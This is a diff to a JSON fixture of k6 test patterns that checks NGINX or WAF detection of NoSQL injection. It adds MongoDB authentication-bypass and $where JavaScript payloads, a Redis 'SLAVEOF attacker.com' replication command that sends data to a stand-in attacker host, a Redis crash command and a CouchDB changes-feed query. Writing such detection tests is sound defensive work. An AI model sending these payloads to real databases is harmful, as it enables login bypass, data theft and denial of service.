@@ -1,7 +1,7 @@
 {
   "metadata": {
     "category": "nosql_extended",
-    "total_patterns": 13,
+    "total_patterns": 20,
     "port": 8011,
     "description": "k6 test patterns for extended NoSQL injection attacks (CouchDB)"
   },
@@ -161,6 +161,97 @@
       "expected_detection": true,
       "severity": "high",
       "expected_rule": "[NGINX Emerging Threat] Redis command injection"
+    },
+    {
+      "id": "NOSQL_MONGO_004",
+      "name": "MongoDB $exists Authentication Bypass",
+      "category": "nosql_extended",
+      "subcategory": "mongodb",
+      "payload": "{\"username\": {\"$exists\": true}, \"password\": {\"$ne\": \"\"}}",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX Emerging Threat] MongoDB NoSQL injection",
+      "description": "MongoDB authentication bypass using $exists and $ne operators",
+      "encoded": "%7B%22username%22%3A%20%7B%22%24exists%22%3A%20true%7D%2C%20%22password%22%3A%20%7B%22%24ne%22%3A%20%22%22%7D%7D"
+    },
+    {
+      "id": "NOSQL_MONGO_005",
+      "name": "MongoDB $and Operator Injection",
+      "category": "nosql_extended",
+      "subcategory": "mongodb",
+      "payload": "{\"$and\": [{\"username\": \"admin\"}, {\"password\": {\"$gt\": \"\"}}]}",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX Emerging Threat] MongoDB NoSQL injection",
+      "description": "MongoDB query injection using $and with $gt operator",
+      "encoded": "%7B%22%24and%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22password%22%3A%20%7B%22%24gt%22%3A%20%22%22%7D%7D%5D%7D"
+    },
+    {
+      "id": "NOSQL_MONGO_006",
+      "name": "MongoDB $or Authentication Bypass",
+      "category": "nosql_extended",
+      "subcategory": "mongodb",
+      "payload": "{\"$or\": [{\"username\": \"admin\"}, {\"username\": \"root\"}]}",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX Emerging Threat] MongoDB NoSQL injection",
+      "description": "MongoDB authentication bypass using $or operator",
+      "encoded": "%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D"
+    },
+    {
+      "id": "NOSQL_MONGO_007",
+      "name": "MongoDB $where JavaScript Injection",
+      "category": "nosql_extended",
+      "subcategory": "mongodb",
+      "payload": "$where=function(){return this.username=='admin'}",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX Emerging Threat] MongoDB NoSQL injection",
+      "description": "MongoDB $where clause with JavaScript injection",
+      "encoded": "%24where%3Dfunction%28%29%7Breturn%20this.username%3D%3D%27admin%27%7D"
+    },
+    {
+      "id": "NOSQL_REDIS_003",
+      "name": "Redis SLAVEOF Command Injection",
+      "category": "nosql_extended",
+      "subcategory": "redis",
+      "payload": "SLAVEOF attacker.com 6379",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX Emerging Threat] Redis command injection",
+      "description": "Redis SLAVEOF command to replicate data to attacker server",
+      "encoded": "SLAVEOF%20attacker.com%206379"
+    },
+    {
+      "id": "NOSQL_REDIS_004",
+      "name": "Redis DEBUG SEGFAULT DoS",
+      "category": "nosql_extended",
+      "subcategory": "redis",
+      "payload": "DEBUG SEGFAULT",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX Emerging Threat] Redis command injection",
+      "description": "Redis DEBUG SEGFAULT to crash the server",
+      "encoded": "DEBUG%20SEGFAULT"
+    },
+    {
+      "id": "NOSQL_COUCH_004",
+      "name": "CouchDB Changes Feed Monitoring",
+      "category": "nosql_extended",
+      "subcategory": "couchdb",
+      "payload": "_changes?feed=continuous&include_docs=true",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX Emerging Threat] MongoDB NoSQL injection",
+      "description": "CouchDB _changes feed for continuous data monitoring",
+      "encoded": "_changes%3Ffeed%3Dcontinuous%26include_docs%3Dtrue"
     }
   ]
 }
